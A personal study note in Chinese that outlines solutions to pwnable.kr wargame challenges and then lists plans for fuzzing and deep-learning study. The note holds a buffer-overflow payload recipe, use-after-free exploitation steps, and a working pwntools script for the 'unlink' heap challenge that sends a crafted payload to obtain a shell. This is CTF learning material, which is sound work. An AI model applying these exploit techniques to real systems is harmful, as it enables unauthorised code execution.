# pwn kr
  - bof(buffer overflow)
    - gdb 调试显示 距离 52 + address
    - payload = 52 * 'A' + address
  - uaf(use after free)
    - main中定义了两个类，然后输入3先free掉
    - 在输入2中输入payload, 因为use after free
    - 其中注意下introduce函数是按栈的顺序进行的， payload要注意这一点
    - 所以我们需要再次分配下
    - 再输入payload后，在输入1，即可运行我们的payload
    - [参考链接](http://blog.csdn.net/qq_20307987/article/details/51511230)
  - unlink
    - 因为是双链表结构，
    - 所以溢出之后还需要把溢出后的地址改一下
    - poc如下
```python
from pwn import *
context(log_level="debug")

shell_addr = 0x080484eb

s =  ssh(host='pwnable.kr',
         port=2222,
         user='unlink',
         password='guest'
        )
p = s.process("./unlink")
p.recvuntil("here is stack address leak: ")
stack_addr = p.recv(10)
stack_addr = int(stack_addr,16)
p.recvuntil("here is heap address leak: ")
heap_addr = p.recv(9)
heap_addr = int(heap_addr,16)
payload = p32(shell_addr)
payload += 'a'*12
payload += p32(heap_addr + 12)
payload += p32(stack_addr + 0x10)
p.send(payload)
p.interactive()
```



# pwn测试步骤
  - [infer](http://fbinfer.com/docs/getting-started.html) 进行静态文件分析
  - afl或者自写的fuzz工具进行fuzz
  - 浏览器fuzz的工具有点无语
  - 学习一下google的fuzz工具以及相关东西
  - 手工的话就是去需要看代码,但是感觉看了也问题不大(主要是对c++等trick不熟，还是对web熟悉一点)
  - 趁着自动化fuzz的时间进行下一步android相关的学习，然后就是深度学习了
  
# 深度学习
  - 等书到了就看书，但感觉用处不大
  - 还有深度学习的原理不太想碰(有时间要去补补)
  - kaggle的手写字符集进行一次训练
  
# fuzz需要CPU和内存， 深度学习需要CPU，内存，显卡，硬盘
# 该去配台好机器，但感觉买了要去打游戏。。
